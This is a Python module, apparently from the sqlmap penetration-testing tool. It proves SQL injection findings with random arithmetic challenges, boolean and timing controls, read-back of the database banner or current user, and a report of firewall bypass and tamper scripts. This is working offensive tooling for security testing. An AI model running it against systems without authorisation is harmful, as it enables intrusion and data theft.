#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os
import time

from lib.core.common import Backend
from lib.core.common import average
from lib.core.common import getCurrentThreadData
from lib.core.common import getSafeExString
from lib.core.common import getUnicode
from lib.core.common import openFile
from lib.core.common import randomInt
from lib.core.common import stdev
from lib.core.common import unArrayizeValue
from lib.core.common import urldecode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import EXPECTED
from lib.core.enums import HTTPMETHOD
from lib.core.enums import PAYLOAD
from lib.core.enums import PLACE
from lib.core.settings import INFERENCE_MARKER
from lib.core.settings import SLEEP_TIME_MARKER

# how many times the differential control is repeated, to show it is stable rather than a coincidence
PROVE_REPETITIONS = 5

# characters of a datum read through an INFERENTIAL technique (one request per bit), so a time-based point
# does not spend minutes reading a banner it has already proven it can read
INFERENTIAL_DATUM_CHARS = 12

# comparison knobs that decide true/false at request time (lib/request/comparison.py reads these globals,
# not injection.conf); they must be re-pointed at the injection being proven or the oracle returns None
_COMPARISON_ATTRS = ("string", "notString", "regexp", "code", "textOnly", "titles")

_LABEL_WIDTH = 10

# getValue() gates, so each experiment runs through ONE named technique and the evidence can be attributed
# to it. Without this the report would credit whatever technique getValue() happened to pick as fastest.
_GATES = {
    PAYLOAD.TECHNIQUE.UNION: {"union": True, "error": False, "blind": False, "time": False},
    PAYLOAD.TECHNIQUE.ERROR: {"union": False, "error": True, "blind": False, "time": False},
    PAYLOAD.TECHNIQUE.QUERY: {"union": False, "error": True, "blind": False, "time": False},
    PAYLOAD.TECHNIQUE.BOOLEAN: {"union": False, "error": False, "blind": True, "time": False},
    PAYLOAD.TECHNIQUE.TIME: {"union": False, "error": False, "blind": False, "time": True},
    PAYLOAD.TECHNIQUE.STACKED: {"union": False, "error": False, "blind": False, "time": True},
}

# techniques that return the value inside the response body; the rest infer it one bit at a time
_INBAND = (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)

# order the experiments run in: cheapest and most demonstrative first
_ORDER = (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY, PAYLOAD.TECHNIQUE.BOOLEAN, PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED)


def _field(label, value):
    """
    Renders one 'Label:   value' line (value column aligned), with any extra list items as continuation
    lines indented under the value.
    """

    lines = list(value) if isinstance(value, (list, tuple)) else [value]
    indent = " " * (_LABEL_WIDTH + 2)
    retVal = "%s:%s%s" % (label, " " * (_LABEL_WIDTH - len(label) + 1), lines[0] if lines else "")
    for extra in lines[1:]:
        retVal += "\n%s%s" % (indent, extra)
    return retVal


def _activateInjection(injection):
    """
    Points the global comparison configuration (and kb.injection) at the injection being proven, so the
    boolean oracle / data retrieval use that injection's own distinguishing signal regardless of what the
    globals drifted to during enumeration. Returns the previous state for restoration.
    """

    saved = dict((_, getattr(conf, _)) for _ in _COMPARISON_ATTRS)
    saved["injection"] = kb.injection

    for attr in _COMPARISON_ATTRS:
        setattr(conf, attr, getattr(injection.conf, attr, None))
    kb.injection = injection

    return saved


def _restoreInjection(saved):
    kb.injection = saved.pop("injection")
    for attr, value in saved.items():
        setattr(conf, attr, value)


def _exchange():
    """
    The wire facts of the request that was just sent: (request line, HTTP code, response bytes, seconds).
    An evidence line without them is an assertion; with them the reader can check the work.
    """

    threadData = getCurrentThreadData()
    parts = (threadData.lastRequestMsg or "").replace("\r\n", "\n").split("\n")
    line = urldecode(parts[1].strip(), convall=True) if len(parts) > 1 else ""
    return line, threadData.lastCode, len(threadData.lastPage or ""), threadData.lastQueryDuration


def _techniques(injection):
    return [_ for _ in _ORDER if _ in injection.data]


def _name(stype):
    return PAYLOAD.SQLINJECTION.get(stype) or "unknown"


def _outcome(ok, detail, exchange):
    """One evidence row: 'PASS  <detail>  HTTP 200, 402 bytes, 0.045s' plus the request line beneath it."""

    line, code, length, duration = exchange
    facts = []
    if code is not None:
        facts.append("HTTP %s" % code)
    if length:
        facts.append("%d bytes" % length)
    if duration:
        facts.append("%.3fs" % duration)
    retVal = ["%-4s %s%s" % ("PASS" if ok else "FAIL", detail, ("  [%s]" % ", ".join(facts)) if facts else "")]
    if line:
        retVal.append("     %s" % line)
    return retVal


def _challenge(injection, a, b):
    """
    The decisive experiment, run once through EVERY confirmed technique.

    The back-end is asked for a*b, where both operands were drawn at random after the scan started. That
    product exists in no page, cache, log or reflection, and no amount of pattern matching in front of the
    application can produce it - only something that evaluates SQL can. An in-band technique must return
    the product itself; an inferential one must answer TRUE to 'a*b=product' AND FALSE to 'a*b=product+1',
    which costs two requests instead of reading the digits back one bit at a time.

    Running it per technique is the point of the report: on a filtered target it shows exactly which
    channels the protection closed and which one still carries data.
    """

    from lib.request import inject

    expected = a * b
    retVal = []

    for stype in _techniques(injection):
        gate = _GATES[stype]
        try:
            if stype in _INBAND:
                value = inject.getValue("%d*%d" % (a, b), expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS, resumeValue=False, suppressOutput=True, **gate)
                exchange = _exchange()
                ok = value is not None and ("%s" % value).strip() == str(expected)
                detail = "returned %s" % value if value is not None else "no value returned"
            else:
                hit = inject.getValue("%d*%d=%d" % (a, b, expected), expected=EXPECTED.BOOL, charsetType=CHARSET_TYPE.BINARY, resumeValue=False, suppressOutput=True, expectingNone=True, **gate)
                exchange = _exchange()      # quote the TRUE probe: on a time-based point that is where the delay shows
                miss = inject.getValue("%d*%d=%d" % (a, b, expected + 1), expected=EXPECTED.BOOL, charsetType=CHARSET_TYPE.BINARY, resumeValue=False, suppressOutput=True, expectingNone=True, **gate)
                ok = bool(hit) and miss is False
                detail = "confirmed %d, rejected %d" % (expected, expected + 1) if ok else "inconclusive (%s/%s)" % (hit, miss)
            retVal.append((stype, ok, _outcome(ok, detail, exchange)))
        except Exception as ex:
            retVal.append((stype, False, ["FAIL %s" % getSafeExString(ex)]))

    return retVal


def _datumQuery(stype):
    """
    A real datum to read out of the back-end, and its label. Inferential techniques pay one request per
    bit, so their datum is bounded with the DBMS' own SUBSTRING template instead of a whole banner.
    """

    dbms = Backend.getIdentifiedDbms()
    entry = queries.get(dbms) if dbms else None
    if entry is None:
        return None, None

    for attr, label in (("banner", "back-end DBMS banner"), ("current_db", "current database"), ("current_user", "current database user")):
        query = getattr(getattr(entry, attr, None), "query", None)
        if not query:
            continue
        if stype in _INBAND:
            return query, label
        template = getattr(getattr(entry, "substring", None), "query", None)
        if template:
            return template % (query, 1, INFERENTIAL_DATUM_CHARS), "%s (first %d characters)" % (label, INFERENTIAL_DATUM_CHARS)
        return query, label

    return None, None


def _datum(passing):
    """
    Reads a real value out of the back-end through a technique the challenge already proved, and reports
    which one returned it. The challenge proves execution; this proves data egress.
    """

    from lib.request import inject

    for stype in passing:
        query, label = _datumQuery(stype)
        if not query:
            continue
        started = kb.requestCounter
        try:
            value = unArrayizeValue(inject.getValue(query, safeCharEncode=False, suppressOutput=True, resumeValue=False, **_GATES[stype]))
        except Exception:
            value = None
        if not value:
            continue
        line, code, length, duration = _exchange()
        head = "%s = %s   [%s]" % (label, repr(getUnicode(value)).lstrip('u'), _name(stype))
        if stype in _INBAND:
            head += "  [HTTP %s, %d bytes, %.3fs]" % (code, length, duration or 0.0)
            return [_field("Read-back", [head, "  %s" % line] if line else [head])]
        # inferred one bit at a time: a single request line would not represent the exchange
        return [_field("Read-back", [head, "  recovered bit by bit over %d requests" % (kb.requestCounter - started)])]

    return []


def _booleanControl(injection):
    """
    The TRUE/FALSE differential, quoted with the artifact that separates them AND with the response facts
    behind it, so the reader can see what the oracle actually looked at.
    """

    from lib.request.inject import getValue

    def _ask(expression):
        result = getValue(expression, expected=EXPECTED.BOOL, charsetType=CHARSET_TYPE.BINARY, suppressOutput=True, expectingNone=True, union=False, error=False, time=False)
        _line, code, length, _duration = _exchange()
        return result, code, length

    n = randomInt()
    trues = falses = 0
    trueCode = falseCode = trueLength = falseLength = None

    for _ in range(PROVE_REPETITIONS):
        result, trueCode, trueLength = _ask("%d=%d" % (n, n))
        trues += bool(result)
        result, falseCode, falseLength = _ask("%d=%d" % (n, n + 1))
        falses += result is False

    retVal = ["TRUE  (%d=%d):  %d/%d  [HTTP %s, %s bytes]" % (n, n, trues, PROVE_REPETITIONS, trueCode, trueLength),
              "FALSE (%d=%d):  %d/%d  [HTTP %s, %s bytes]" % (n, n + 1, falses, PROVE_REPETITIONS, falseCode, falseLength)]

    if injection.conf.string:
        retVal.append("separated by: the response contains %s only when TRUE" % repr(injection.conf.string).lstrip('u'))
    elif injection.conf.notString:
        retVal.append("separated by: the response contains %s only when FALSE" % repr(injection.conf.notString).lstrip('u'))
    elif injection.conf.code:
        retVal.append("separated by: the HTTP status code")
    elif injection.conf.titles:
        retVal.append("separated by: the page title")
    else:
        retVal.append("separated by: response content similarity")

    # a TRUE condition answered by a 4xx is a block, not a database answer - the caller needs to know
    return retVal, (bool(injection.conf.code) and (trueCode or 0) >= 400)


def _timeControl(injection, stype):
    """
    Sweeps the injected delay (0 / T / 2T seconds) and shows the response time follows it. The 0s case is
    the control: a slow application or a congested network cannot switch itself off on command.
    """

    from lib.core.agent import agent
    from lib.core.common import popValue, pushValue
    from lib.request.connect import Connect as Request

    vector = (injection.data.get(stype) or {}).get("vector")

    benign = []
    for _ in range(3):
        try:
            Request.queryPage(timeBasedCompare=True, raise404=False, silent=True)
            benign.append(getCurrentThreadData().lastQueryDuration)
        except Exception:
            pass
    baseAvg = average(benign) if benign else 0.0
    baseStd = stdev(benign) if len(benign) >= 2 else 0.0

    if not (vector and SLEEP_TIME_MARKER in vector):
        # a heavy-query delay carries no parameterizable seconds, so there is nothing to sweep
        return ["a TRUE condition delays the response well beyond the normal ~%.3fs (jitter ~%.3fs)" % (baseAvg, baseStd)]

    n = randomInt()
    base = conf.timeSec or 5
    measurements = []

    for k in (0, base, 2 * base):
        pushValue(conf.timeSec)
        conf.timeSec = k
        try:
            query = agent.suffixQuery(agent.prefixQuery(vector.replace(INFERENCE_MARKER, "%d=%d" % (n, n))))
            Request.queryPage(agent.payload(newValue=query), timeBasedCompare=True, raise404=False, silent=True)
            measurements.append((k, getCurrentThreadData().lastQueryDuration))
        except Exception:
            measurements.append((k, None))
        finally:
            conf.timeSec = popValue()

    if any(d is None for _, d in measurements):
        return ["a TRUE condition delays the response well beyond the normal ~%.3fs (jitter ~%.3fs)" % (baseAvg, baseStd)]

    d0, dT, d2T = (measurements[0][1], measurements[1][1], measurements[2][1])
    retVal = ["unmodified request:  %.3fs (jitter ~%.3fs)" % (baseAvg, baseStd),
              "injected delay:      %s" % "   ".join("%ds -> %.2fs" % (k, d) for k, d in measurements)]

    # only claim 1:1 scaling when the measurements really track the injected seconds. A heavy-query delay
    # also rides [SLEEPTIME] but does not scale linearly, so it must not be rendered as a controlled delay.
    if d0 < max(0.5, base * 0.5) and abs(dT - base) <= base * 0.5 and abs(d2T - 2 * base) <= base * 0.6 and d2T > dT:
        retVal.append("the delay follows the injected value ~1:1, and 0s returns at normal speed")
    return retVal


# response codes a protection returns when it drops a request, rather than the application answering
_BLOCKED_CODES = (403, 406, 419, 429, 501, 503)


def _evasion():
    """
    What the proof had to get through. On a filtered target this is the part that matters: the evidence
    above is worth much more when the report also states that a protection was in the path and what was
    needed to carry data past it.
    """

    retVal = []
    if kb.identifiedWafs:
        retVal.append("protection identified: %s" % ", ".join(sorted(kb.identifiedWafs)))
    elif kb.wafBypass is not None:
        retVal.append("protection detected in front of the application (not fingerprinted)")
    if kb.wafBypass:
        retVal.append("automatic bypass applied: non-scanner User-Agent and browser-like headers")
    names = ", ".join(sorted(_.__name__.rsplit('.', 1)[-1] for _ in (kb.tamperFunctions or [])))
    if names or conf.tamper:
        retVal.append("tamper scripts in effect: %s" % (names or conf.tamper))
    blocked = ", ".join("%d x%d" % (code, count) for code, count in sorted((kb.httpErrorCodes or {}).items()) if code in _BLOCKED_CODES)
    if blocked:
        retVal.append("responses refused by the protection during the run: %s" % blocked)
    if kb.droppingRequests:
        retVal.append("the target dropped or reset requests during the scan (retried)")
    if conf.delay:
        retVal.append("requests were delayed by %.2fs each" % conf.delay)
    return retVal


def _proveInjection(injection):
    """
    Runs every experiment for one injection point and renders its block. Returns (fields, proven).
    """

    saved = _activateInjection(injection)
    started = kb.requestCounter

    try:
        a, b = randomInt(4), randomInt(4)   # 4-digit operands: the product stays inside a 32-bit INT on every DBMS, yet is unguessable
        rows = _challenge(injection, a, b)
        passing = [stype for stype, ok, _ in rows if ok]

        blocked = None
        control = []
        stype = passing[0] if passing else (_techniques(injection) or [None])[0]

        if PAYLOAD.TECHNIQUE.BOOLEAN in injection.data:
            control, blocked = _booleanControl(injection)
            controlLabel = "boolean differential"
        elif PAYLOAD.TECHNIQUE.TIME in injection.data or PAYLOAD.TECHNIQUE.STACKED in injection.data:
            control = _timeControl(injection, PAYLOAD.TECHNIQUE.TIME if PAYLOAD.TECHNIQUE.TIME in injection.data else PAYLOAD.TECHNIQUE.STACKED)
            controlLabel = "timing control"
        else:
            controlLabel = None

        readback = _datum(passing)
    finally:
        _restoreInjection(saved)

    paramType = conf.method if conf.method not in (None, HTTPMETHOD.GET, HTTPMETHOD.POST) else injection.place
    fields = [_field("Parameter", "%s (%s)" % (injection.parameter, paramType)),
              _field("Techniques", ", ".join(_name(_) for _ in _techniques(injection)) or "none")]

    challenge = ["the back-end must compute %d*%d = %d, drawn at random after the scan started" % (a, b, a * b),
                 "(the product is in no page, cache or reflection - only something that evaluates SQL can return it)"]
    for stype, _ok, lines in rows:
        challenge.append("%s:" % _name(stype))
        challenge.extend("  %s" % _ for _ in lines)
    fields.append(_field("Challenge", challenge))

    fields.extend(readback)

    if control:
        fields.append(_field("Control", ["%s" % controlLabel] + ["  %s" % _ for _ in control]))

    evasion = _evasion()
    if evasion:
        fields.append(_field("Evasion", evasion))

    proven = bool(passing)
    if proven:
        through = " through the protection in front of the application" if (kb.identifiedWafs or kb.wafBypass) else ""
        verdict = ["PROVEN - the back-end executed injected SQL and returned the result%s" % through,
                   "channels that carry data: %s" % ", ".join(_name(_) for _ in passing)]
        failed = [_name(stype) for stype, ok, _ in rows if not ok]
        if failed:
            verdict.append("channels that did NOT answer: %s" % ", ".join(failed))
    else:
        verdict = ["NOT PROVEN - no technique returned the computed value"]
        if blocked:
            verdict.append("a TRUE condition answers with an HTTP error - that is a block, not a database answer")
        if kb.identifiedWafs or kb.droppingRequests or blocked:
            verdict.append("a protection is interfering, so this may be a real injection whose data channel is blocked")
            verdict.append("=> re-test without the protection, or with '--tamper', then prove again")
        else:
            verdict.append("the reported injection point reproduces a differential but cannot execute SQL")
            verdict.append("=> treat it as a FALSE POSITIVE unless a side effect proves otherwise (e.g. '--os-shell')")

    verdict.append("%d requests spent on this proof" % (kb.requestCounter - started))
    fields.append(_field("Verdict", verdict))

    return fields, proven


def proveExploitation():
    """
    Renders a verifiable demonstration of exploitation for every confirmed injection point (switch
    '--proof'). It does not restate what detection reported: each claim is an experiment with a control,
    an unpredictable expected value, and the request line, HTTP status, response size and timing that
    produced it - and every claim is attributed to the technique that produced it. Written to stdout and
    to '<output>/proof.txt'.
    """

    injections = [_ for _ in (kb.injections or []) if getattr(_, "place", None)]
    if not injections:
        return

    target = conf.url or ""
    if conf.parameters.get(PLACE.GET) and "?" not in target:        # spell out the full GET target, not just the path
        target += "?%s" % conf.parameters[PLACE.GET]

    fields = [_field("Target", target)]
    if conf.parameters.get(PLACE.POST):
        fields.append(_field("Data", conf.parameters[PLACE.POST]))
    if Backend.getIdentifiedDbms():
        fields.append(_field("Back-end", Backend.getIdentifiedDbms()))
    fields.append(_field("Verified", time.strftime("%Y-%m-%d %H:%M:%S")))

    proven = 0
    for injection in injections:
        block, ok = _proveInjection(injection)
        proven += int(ok)
        fields.append("")
        fields.extend(block)

    if proven == len(injections):
        header = "sqlmap proved exploitation of the following injection point(s)"
    elif proven:
        header = "sqlmap proved exploitation of %d of %d reported injection point(s)" % (proven, len(injections))
    else:
        header = "sqlmap could NOT prove exploitation of the reported injection point(s)"

    data = "\n".join(fields)
    conf.dumper.string(header, data)

    try:
        path = os.path.join(conf.outputPath or ".", "proof.txt")
        with openFile(path, "w+") as f:
            f.write("%s:\n---\n%s\n---\n" % (header, data))
        logger.info("proof of exploitation written to '%s'" % path)
    except Exception:
        pass
